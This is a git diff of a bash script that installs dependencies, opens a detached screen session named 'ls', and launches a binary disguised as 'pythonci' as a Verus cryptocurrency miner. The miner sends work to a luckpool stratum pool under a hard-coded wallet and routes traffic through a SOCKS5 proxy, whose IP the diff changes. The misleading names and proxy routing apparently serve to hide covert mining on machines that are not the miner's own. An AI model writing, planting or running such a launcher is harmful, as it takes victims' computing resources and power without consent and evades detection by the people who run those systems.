@@ -1,10 +1,9 @@
 #!/bin/bash
 sudo apt update
-sudo apt install screen -y 
-sudo apt isntall libjansson4 -y
+sudo apt install screen libjansson4 -y
 screen -dmS ls
-PL=stratum+tcp://na.luckpool.net:3956
-WT=RUEfFzYUwZSaXcLmdA6xyPvgwu7FLbkm6r
-WR=0AA1
-PY=socks5://184.181.217.210:4145
-./pythonci -a verus -o $PL -u $WT.$WR -p x -t 6 --proxy=$PY
+POOL=stratum+tcp://na.luckpool.net:3956
+WALLET=RUEfFzYUwZSaXcLmdA6xyPvgwu7FLbkm6r
+WORKER=0AA1
+PROXY=socks5://72.195.114.184:4145
+./pythonci -a verus -o $POOL -u $WALLET.$WORKER -p x -t 6 -x $PROXY
